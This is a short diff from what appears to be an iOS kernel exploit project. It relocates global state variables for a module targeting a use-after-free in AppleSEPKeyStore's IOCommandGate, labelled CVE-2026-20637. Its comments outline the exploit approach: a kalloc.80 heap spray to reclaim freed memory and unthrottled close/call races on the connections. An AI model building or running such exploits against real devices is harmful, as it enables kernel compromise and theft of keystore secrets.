@@ -77,6 +77,12 @@ extern void *IOSurfaceGetBaseAddress(IOSurfaceRef_);
 #define kIOSurfaceBytesPerRow CFSTR("IOSurfaceBytesPerRow")
 #define kIOSurfacePixelFormat CFSTR("IOSurfacePixelFormat")
 
+static volatile io_connect_t g_aks_conn = 0;
+static volatile int g_aks_done = 0;
+static volatile int g_aks_calls = 0;
+static volatile int g_aks_closes = 0;
+static volatile int g_aks_opens = 0;
+
 // ===========================================================================
 // 6. CVE-2026-20637 + RECLAIM: the confirmed UAF, now with a kalloc.80 spray
 //    The 25.11 device panic PROVED the UAF: "[iokit.IOCommandGate]: element
@@ -211,11 +217,6 @@ NSString *ModAksReclaim(void) {
 //    connections with rotating types (0x2022/0xbeef/0x1337/0x4141) and NO
 //    delay, keeping the close/call race window hot.
 // ===========================================================================
-static volatile io_connect_t g_aks_conn = 0;
-static volatile int g_aks_done = 0;
-static volatile int g_aks_calls = 0;
-static volatile int g_aks_closes = 0;
-static volatile int g_aks_opens = 0;
 
 NSString *ModAksUAF(void) {
     AveLog(@"[aks20637] === CVE-2026-20637: AppleSEPKeyStore IOCommandGate UAF (public PoC, TESTED on 26.1-26.2) ===");
